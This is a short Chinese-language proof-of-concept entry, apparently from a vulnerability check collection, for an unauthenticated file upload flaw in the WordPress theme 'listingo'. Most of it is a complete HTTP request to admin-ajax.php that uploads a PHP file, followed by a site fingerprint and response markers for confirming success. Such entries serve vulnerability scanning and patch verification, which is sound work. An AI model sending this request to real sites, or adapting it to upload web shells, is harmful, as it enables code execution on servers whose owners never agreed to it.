﻿# WordPress listingo 文件上传漏洞

> 更新时间：2023-12-31

> 漏洞编号：

> 漏洞说明：WordPress模板 listingo 存在文件上传漏洞。

> 漏洞特征：body="wp-content/themes/listingo"

> 验证脚本：HTTP

```
POST /wp-admin/admin-ajax.php?action=listingo_temp_uploader HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8rVjnfcgxgKoytcg
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundary8rVjnfcgxgKoytcg
Content-Disposition: form-data; name="listingo_uploader";filename="1008.php"
Content-Type:text/php

<?php
phpinfo();
?>
------WebKitFormBoundary8rVjnfcgxgKoytcg
Content-Disposition: form-data; name="submit"

Start Uploader
------WebKitFormBoundary8rVjnfcgxgKoytcg--
```

> 响应代码特征：200

> 响应内容特征：wp-custom-uploader

> 上传文件定位：


> 验证文件来源：WordPress listingo 文件上传漏洞.poc
